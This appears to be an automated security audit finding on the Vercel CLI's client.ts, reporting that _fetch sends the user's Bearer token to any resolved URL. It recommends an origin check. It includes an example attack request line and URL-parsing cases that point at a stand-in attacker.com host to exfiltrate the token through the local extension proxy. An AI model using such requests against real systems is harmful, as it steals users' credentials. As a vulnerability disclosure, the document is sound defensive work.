# [MEDIUM] _fetch attaches Bearer token to any URL without origin validation

**File:** [`packages/cli/src/util/client.ts`](https://github.com/vercel/vercel/blob/melkey/bun-working-branch/blob/melkey/packages/cli/src/util/client.ts#L352-L402) (lines 352, 353, 379, 380, 402)
**Project:** vercel
**Severity:** MEDIUM  •  **Confidence:** medium  •  **Slug:** `other-credential-exfiltration-via-bare-fetch`

## Owners

**Suggested assignee:** `elvis@vercel.com` _(via last-committer)_

## Finding

_fetch() resolves the URL via new URL(_url, this.apiUrl) at L353 and unconditionally attaches `Authorization: Bearer <token>` at L379-381 whenever authConfig.token is set, with no check that the resolved URL still belongs to apiUrl. URL parsing semantics mean an absolute or protocol-relative _url overrides the base: new URL('http://attacker.com/x', 'https://api.vercel.com').href === 'http://attacker.com/x' and new URL('//attacker.com/x', ...) likewise. Internal callers in this repo all pass hardcoded paths and the `vercel api` command (commands/api/index.ts L141-159) explicitly validates the resolved origin against API_BASE_URL — exactly because the authors know fetch() is unsafe with arbitrary URLs. However util/extension/proxy.ts L23 forwards req.url verbatim from the local extension HTTP proxy: a process that connects to 127.0.0.1 on the proxy's random port and sends a request line like `GET http://attacker.com/ HTTP/1.1` will end up with req.url === 'http://attacker.com/', causing client.fetch to send the user's Bearer token to attacker.com. The proxy is on loopback but that is shared across local users on the system and is accessible to any extension/subprocess running while it's open. Hardening _fetch to refuse cross-origin URLs (or to drop the Authorization header when the resolved origin doesn't match apiUrl) would close this and any future caller that forgets to validate.

## Recommendation

After computing `const url = new URL(_url, this.apiUrl)`, verify `url.origin === new URL(this.apiUrl).origin`. If not, either throw or omit the Authorization header. This matches the existing defensive pattern used by `vercel api` (commands/api/index.ts L149-159) and centralizes the check so future callers inherit it.

## Recent committers (`git log`)

- Elvis Pranskevichus <elvis@vercel.com> (2026-04-29)
- Jeff See <jeffsee.55@gmail.com> (2026-04-16)
- Bhrigu Srivastava <bhrigu.srivastava@vercel.com> (2026-04-14)
- MelkeyDev <53410236+Melkeydev@users.noreply.github.com> (2026-04-04)
